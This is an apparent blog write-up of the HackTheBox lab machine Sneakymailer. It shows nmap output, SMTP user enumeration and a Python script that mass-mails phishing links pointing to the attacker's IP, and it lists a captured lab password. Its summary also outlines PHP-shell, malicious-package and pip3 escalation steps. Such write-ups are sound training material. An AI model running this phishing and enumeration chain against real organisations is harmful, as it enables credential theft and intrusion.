<!DOCTYPE html>
<html lang="en">
    <head>
</script><script type="text/javascript" src="/lightgallery/lightbox.js"></script>
<link rel="stylesheet" href="/lightgallery/lightbox.css">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="preload" as="style" href="/assets/css/post.css">
<link rel="preload" as="style" href="/assets/css/syntax.css">
<link rel="stylesheet" href="/assets/css/post.css">
<link rel="stylesheet" href="/assets/css/syntax.css">
<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
<script src="/assets/js/dist/toc.min.js" async></script>
<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:title" content="Hackthebox Sneakymailer writeup"/>
<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:image" content="/hackthebox/sneakymailer/sneakymailer.png"/>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@0xdedinfosec">
<meta property="twitter:title" content="Hackthebox Sneakymailer writeup">
<meta name="twitter:creator" content="@0xdedinfosec">
<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/sneakymailer/sneakymailer.png">
<title>Hackthebox Sneakymailer writeup | 0xDedinfosec</title>
<meta name="generator" content="Jekyll v4.1.0"/>
<meta property="og:title" content="Hackthebox Sneakymailer writeup"/>
<meta name="author" content="Dedinfosec"/>
<meta property="og:locale" content="en_US"/>
<meta name="description" content="Introduction@Sneakymailer:~$"/>
<meta property="og:description" content="Introduction@Sneakymailer:~$"/>
<link rel="canonical" href="http://0xdedinfosec.github.io/posts/htb-sneakymailer/"/>
<meta property="og:url" content="http://0xdedinfosec.github.io/posts/htb-sneakymailer/"/>
<meta property="og:site_name" content="0xDedinfosec"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2020-07-12T00:00:00+00:00"/>
<meta name="twitter:card" content="summary"/>
<meta property="twitter:title" content="Hackthebox Sneakymailer writeup"/>
<meta name="twitter:site" content="@0xdedinfosec"/>
<meta name="twitter:creator" content="@Dedinfosec"/>
<meta name="google-site-verification" content="UfGDXP7MiKxFhS_R1LKVTpk3Cf20Hj-53gHZJrOFXuA"/>
<script type="application/ld+json">
     {"@type":"BlogPosting","headline":"Hackthebox Sneakymailer writeup","dateModified":"2020-07-12T00:00:00+00:00","datePublished":"2020-07-12T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0xdedinfosec.github.io/posts/htb-sneakymailer/"},"author":{"@type":"Person","name":"Dedinfosec"},"url":"http://0xdedinfosec.github.io/posts/htb-sneakymailer/","description":"Introduction@Sneakymailer:~$","@context":"https://schema.org"}
</script>
<!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2019 Cotes Chung Published under the MIT license -->
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png">
<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png">
<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/manifest.json">
<meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'>
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png">
<meta name="theme-color" content="#ffffff">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="dns-prefetch" href="https://fonts.gstatic.com">
<link rel="preconnect" href="cdn.jsdelivr.net">
<link rel="dns-prefetch" href="cdn.jsdelivr.net">
<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin>
<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
<link rel="preload" as="style" href="/assets/css/main.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin>
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
<script>
    window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>');
</script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script>
<script src="/assets/js/dist/commons.js" async></script>
<script src="/assets/js/dist/timeago.min.js" async></script>
<link rel="preload" as="style" href="/assets/css/post.css">
<link rel="preload" as="style" href="/assets/css/syntax.css">
<link rel="stylesheet" href="/assets/css/post.css">
<link rel="stylesheet" href="/assets/css/syntax.css">
<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
<script src="/assets/js/dist/toc.min.js" async></script>
<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:title" content="Hackthebox Sneakymailer writeup"/>
<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
<meta property="og:image" content="/hackthebox/sneakymailer/sneakymailer.png"/>
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@0xdedinfosec">
<meta property="twitter:title" content="Hackthebox Sneakymailer writeup">
<meta name="twitter:creator" content="@0xdedinfosec">
<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/sneakymailer/sneakymailer.png">
<script src="/assets/js/dist/tooltip-loader.min.js" async></script>
<body data-spy="scroll" data-target="#toc">
    <div id="sidebar" class="d-flex flex-column">
        <div id="nav-wrapper">
            <div id="profile-wrapper" class="d-flex flex-column">
                <div id="avatar" class="d-flex justify-content-center">
                    <a href="/" alt="avatar">
                        <img src="/assets/img/sample/avater1.png" alt="avatar">
                    </a>
                </div>
                <div class="profile-text mt-3">
                    <div id="site-title">
                        <a href="/">0xDedinfosec</a>
                    </div>
                    <div id="site-subtitle" class="font-italic">InfoSec/Cybersec Blog And Writeups</div>
                </div>
            </div>
            <ul class="nav flex-column">
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i>
                        <span>HOME</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/donation/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fab fa-donate ml-3 mr-3 unloaded"></i>
                        <span>DONATION-OSCP</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i>
                        <span>CATEGORIES</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i>
                        <span>TAGS</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i>
                        <span>TIMELINE</span>
                    </a>
                </li>
                <li class="nav-item d-flex justify-content-center ">
                    <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100">
                        <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i>
                        <span>WHOAMI</span>
                    </a>
                </li>
            </ul>
        </div>
        <div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4">
            <span id="mode-toggle-wrapper">
                <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License -->
                <i class="mode-toggle fas fa-sun" light-mode-invisible></i>
                <i class="mode-toggle fas fa-moon" dark-mode-invisible></i>
                <script type="text/javascript">
                    class ModeToggle {
                        static get MODE_KEY() {
                            return "mode";
                        }
                        static get DARK_MODE() {
                            return "dark";
                        }
                        static get LIGHT_MODE() {
                            return "light";
                        }
                        constructor() {
                            if (this.mode != null) {
                                if (this.mode == ModeToggle.DARK_MODE) {
                                    if (!this.isDarkPrefer) {
                                        this.setDark();
                                    }
                                } else {
                                    if (this.isDarkPrefer) {
                                        this.setLight();
                                    }
                                }
                            }
                            var self = this;
                            /* always follow the system prefers */
                            this.sysDarkPrefers.addListener(function() {
                                if (self.mode != null) {
                                    if (self.mode == ModeToggle.DARK_MODE) {
                                        if (!self.isDarkPrefer) {
                                            self.setDark();
                                        }
                                    } else {
                                        if (self.isDarkPrefer) {
                                            self.setLight();
                                        }
                                    }
                                    self.clearMode();
                                }
                            });
                        }
                        /* constructor() */
                        setDark() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
                        }
                        setLight() {
                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
                        }
                        clearMode() {
                            $('html').removeAttr(ModeToggle.MODE_KEY);
                            sessionStorage.removeItem(ModeToggle.MODE_KEY);
                        }
                        get sysDarkPrefers() {
                            return window.matchMedia("(prefers-color-scheme: dark)");
                        }
                        get isDarkPrefer() {
                            return true;
                        }
                        get mode() {
                            return sessionStorage.getItem(ModeToggle.MODE_KEY);
                        }
                        flipMode() {
                            if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) {
                                this.setLight();
                            } else {
                                /* light mode or default-light */
                                this.setDark();
                            }
                        }
                    }
                    /* ModeToggle */
                    let toggle = new ModeToggle();
                    $(".mode-toggle").click(function() {
                        toggle.flipMode();
                    });
                </script>
            </span>
            <span class="icon-border"></span>
            <a href="https://www.hackthebox.eu/home/users/profile/262485" target="_blank">
            </i><i class="fas fa-cube"></i>
            </a>
            <a href="https://github.com/0xdedinfosec" target="_blank">
                <i class="fab fa-github"></i>
            </a>
            <a href="#">
                <i class="fab fa-discord"></i>
            </a>
            <a href="#">
                <i class="fab fa-twitter"></i>
            </a>
            <a href="https://www.facebook.com/dedsecinfoServices/" target="_blank"> <i class="fab fa-facebook"></i> </a>
            </div></div>
<div id="main-wrapper">
    <!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License -->
    <div id="topbar-wrapper" class="row justify-content-center topbar-down">
        <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
            <span id="breadcrumb">
                <span>
                    <a href="/">Posts </a>
                </span>
                <span>Hackthebox Sneakymailer writeup</span>
            </span>
            <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
            <div id="topbar-title">Post</div>
            <i id="search-trigger" class="fas fa-search fa-fw"></i>
            <span id="search-wrapper" class="align-items-center">
                <i class="fas fa-search fa-fw"></i>
                <input class="form-control" id="search-input" type="search" placeholder="Search...">
                <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
            </span>
            <span id="search-cancel">Cancel</span>
        </div>
    </div>
    <div id="main">
        <div class="row">
            <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
                <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
                    <h1 data-toc-skip>Hackthebox Sneakymailer writeup</h1>
                    <div class="post-meta text-muted d-flex flex-column">
                        <div>
                            <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 9, 2020, 12:00 AM +0000">
                                Jul 12, 2020 <i class="unloaded">2020-07-12T00:00:00+00:00</i>
                            </span>
                            on <a href='/categories/hackthebox/'>Hackthebox</a>
                            , <a href='/categories/retired/'>retired</a>
                        </div>
                    </div>
                    <div class="post-content">
                        <img src="/hackthebox/sneakymailer/sneakymailer.png">
                        <h1>Introduction@Sneakymailer:~$</h1>
                        <table>
                            <thead>
                                <tr>
                                    <th>Column
                                    <th>
                                        Details
                                        <tbody>
                                            <tr>
                                                <td>Name
                                                <td>
                                                    Sneakymailer
                                                    <tr>
                                                        <td>IP
                                                        <td>
                                                            10.10.10.197
                                                            <tr>
                                                                <td>Points
                                                                <td>
                                                                    30
                                                                    <tr>
                                                                        <td>Os
                                                                        <td>
                                                                            Linux
                                                                            <tr>
                                                                                <td>Difficulty
                                                                                <td>
                                                                                    Medium
                                                                                    <tr>
                                                                                        <td>Creator
                                                                                        <td>
                                                                                            <a href="https://www.hackthebox.eu/home/users/profile/106709" target="_blank">Sulcud</a>
                                                                                            <tr>
                                                                                                <td>Out On
                                                                                                <td>11 July 2020
                        </table>
                        <h1 id="summary">Summary</h1>
                        <ul><li><code class="language-plaintext highlighter-rouge">Nmap</code> revealed a new <strong>domain</strong></li><li>Got a list of employees and their <strong>emails</strong></li><li>Stroing all 57 <code class="language-plaintext highlighter-rouge">emails</code> to a file</li><li>Using <strong>Swaks</strong> to send a spoofed email from <strong>CEO</strong></li><li>Making a python <strong><code class="language-plaintext highlighter-rouge">script</code></strong> to send spoofed email to all <code class="language-plaintext highlighter-rouge">employees</code></li><li><strong>Phishing</strong> the employees</li><li>Got a response from <code class="language-plaintext highlighter-rouge">paulbyrd</code> containing his <code class="language-plaintext highlighter-rouge">password</code> and email</li><li>Using that <strong>password</strong> on the <strong>imap</strong> and reading his mails</li><li>Got credentials that worked on <code class="language-plaintext highlighter-rouge">ftp</code></li><li>Uploading <strong>PHP</strong> shell to <strong>ftp</strong> and accessing it on website with a new subdomain</li><li>Got an initial shell as <code class="language-plaintext highlighter-rouge">www-data</code></li><li>Got a <strong>hash</strong> from <strong>.htpasswd</strong> file of pypi server</li><li>Cracking it via <code class="language-plaintext highlighter-rouge">john</code></li><li>Building a <strong>pypi</strong> package and embeding our <strong>payload</strong> in it</li><li>Abusing <code class="language-plaintext highlighter-rouge">pypi</code> to get shell as <code class="language-plaintext highlighter-rouge">low</code> using netcat</li><li>Abusing <code class="language-plaintext highlighter-rouge">pypi</code> to get ssh shell as <code class="language-plaintext highlighter-rouge">low</code> by writing public key</li><li>Got <strong>user.txt</strong></li><li>Low can run <strong>pip3</strong> as root without password</li><li>Following <code class="language-plaintext highlighter-rouge">gtfobins</code> and exploiting <code class="language-plaintext highlighter-rouge">pip3</code></li><li>Got <strong>root.txt</strong></li></ul>
                                <h1 id="recon">Recon</h1>
                                <h2 id="nmap">Nmap</h2>
                                <div class="language-bash highlighter-rouge">
                                    <div class="highlight">
                                        <code>
                                                <table class="rouge-table">
                                                    <tbody>
                                                        <tr>
                                                            <td class="rouge-gutter gl">
                                                                <pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
</pre>
                                                            <td class="rouge-code">
                                                                <pre>

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 09:29 IST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating NSE at 09:29
Completed NSE at 09:29, 0.00s elapsed
Initiating Ping Scan at 09:29
Scanning 10.10.10.197 [4 ports]
Completed Ping Scan at 09:29, 0.34s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:29
Scanning dev.sneakycorp.htb (10.10.10.197) [1000 ports]
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
Discovered open port 8080/tcp on 10.10.10.197
Completed SYN Stealth Scan at 09:29, 11.04s elapsed (1000 total ports)
Initiating Service scan at 09:29
Scanning 7 services on dev.sneakycorp.htb (10.10.10.197)
Completed Service scan at 09:29, 11.81s elapsed (7 services on 1 host)
Initiating OS detection (try #1) against dev.sneakycorp.htb (10.10.10.197)
Retrying OS detection (try #2) against dev.sneakycorp.htb (10.10.10.197)
Retrying OS detection (try #3) against dev.sneakycorp.htb (10.10.10.197)
Retrying OS detection (try #4) against dev.sneakycorp.htb (10.10.10.197)
Retrying OS detection (try #5) against dev.sneakycorp.htb (10.10.10.197)
Initiating Traceroute at 09:30
Completed Traceroute at 09:30, 0.32s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 09:30
Completed Parallel DNS resolution of 2 hosts. at 09:30, 0.57s elapsed
NSE: Script scanning 10.10.10.197.
Initiating NSE at 09:30
Completed NSE at 09:30, 19.73s elapsed
Initiating NSE at 09:30
Completed NSE at 09:30, 31.01s elapsed
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
Nmap scan report for dev.sneakycorp.htb (10.10.10.197)
Host is up (0.66s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
80/tcp   open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.14.2
|_http-title: Employee - Dashboard
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: completed CAPABILITY IDLE NAMESPACE ACL THREAD=REFERENCES QUOTA CHILDREN UTF8=ACCEPTA0001 IMAP4rev1 ENABLE OK ACL2=UNION STARTTLS THREAD=ORDEREDSUBJECT SORT UIDPLUS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd (released 2018)
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Issuer: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-14T17:14:21
| Not valid after:  2021-05-14T17:14:21
| MD5:   3faf 4166 f274 83c5 8161 03ed f9c2 0308
|_SHA-1: f79f 040b 2cd7 afe0 31fa 08c3 b30a 5ff5 7b63 566c
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=7/13%OT=21%CT=1%CU=36468%PV=Y%DS=2%DC=T%G=Y%TM=5F0BDC7
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 7.778 days (since Sun Jul  5 14:50:01 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   322.24 ms 10.10.14.1
2   322.25 ms dev.sneakycorp.htb (10.10.10.197)

NSE: Script Post-scanning.
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
Initiating NSE at 09:30
Completed NSE at 09:30, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.42 seconds
Raw packets sent: 1619 (75.262KB) | Rcvd: 1163 (50.101KB)
                                                                </pre>
                                                </table>
                                            </code>
                                    </div>
                                </div>
                                <li>in the nmap results we see a host name: <code class="language-plaintext highlighter-rouge">http://sneakycorp.htb</code> , Now adding host name to etc/hosts file</li>
                                            
                                                    <h2 class="mt-4 py-3"><code class="language-plaintext highlighter-rouge">Port - 80</code></h2>
                                                    <li>When we visit to this page  <code class="language-plaintext highlighter-rouge">http://sneakycorp.htb/team.php</code> we see a bunch of users/email addresses on top of notification icon</li>
                                            
                                                    <img src="/hackthebox/sneakymailer/web.png" class="port" class="py-3" class="width=" 100%" height="340">
                                            
                                                    <hr class="my-4">
                                            
                                                    <li class="mt-4">When we look at the <code class="language-plaintext highlighter-rouge">source code </code> we can read the messages</li>
                                                    <img src="/hackthebox/sneakymailer/source.png" class="port" class="py-3" class="width=" 100%" height="600">
                                                    <hr class="my-4">
                                            
                                                    <h2 class="mt-4 py-3"><code class="language-plaintext highlighter-rouge">SNMP</code></h2>
                                                    <li>Also another DNS name should be added to our hosts file: <code class="language-plaintext highlighter-rouge">sneakymailer.htb</code></li>
                                                    <li>After this I decided to enumerate the e-mail addresses to see which ones are valid with help of using telnet for that</li>
                                                    <li><code class="language-plaintext highlighter-rouge">telnet 10.10.10.197 25</code></li>
                                                    <li>vrfy bradleygreer@sneakymailer.htb (verifying which emails are correct because so many e-mails are there)</li>
                                                    <hr class="my-4">
                                                    <img src="/hackthebox/sneakymailer/telnet.png" class="port" class="width=" 100%" height="350" alt="">
                                            
                                                    <hr class="my-4">
                                            
                                                    <li>I just grabbed a few random in the list and it seems that they all  are valid.</li>
                                                    <li>After that I created a <code class="language-plaintext highlighter-rouge">python script</code> to e-mail every user</li>
                                            
                                                    <div class="language-bash highlighter-rouge">
                                                    <pre><code style="color: white;">
    # Import SMTP Library
    import smtplib

    # Import email modules
    from email.message import EmailMessage

    # Sender and Receiver
    sender = 'example@example.com'  #change this to your gmail account
    receivers = [line.strip() for line in open('email.txt')]

    # Message
    message = EmailMessage()

    message['Subject'] = 'Welcome'
    message['From'] = sender
    message['To'] = receivers

    message.set_content('http://10.10.14.8') # change this to your tun0 ip address

    # Send email
    try:

    smtpObj = smtplib.SMTP('10.10.10.197', 25)

    smtpObj.send_message(message)

    print("Email sent")

    except smtplib.SMTPException:

    print("Error sending email")

    finally:
        smtpObj.quit()
                                                    </code></pre>
                                                    </div>
                                            
                                                    <li>after running the script and listening on <code class="language-plaintext highlighter-rouge">port 80</code>, we got the response:</li>
                                            
                                                    <img src="/hackthebox/sneakymailer/1.png" class="port" class="py-3" class="width=" 100%" height="120" alt="">
                                            
                                                    <img src="/hackthebox/sneakymailer/2.png" class="port" class="py-1" class="width=" 100%" height="202" alt="">
                                            
                                                    <li class="py-2">We got some Url Encoded string , after decoding them finally , we found some credentials</li>
                                                    <li class="py-2">https://www.urldecoder.org/</li>
                                                    <li class="py-2"><code class="language-plaintext highlighter-rouge">paulbyrd@sneakymailer.htb:^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht</code> </li> <li class="py-2">Trying these credentials on the imap service</li>
                                                    <li class="py-2"><code class="language-plaintext highlighter-rouge">telnet 10.10.10.197 143</code></li>
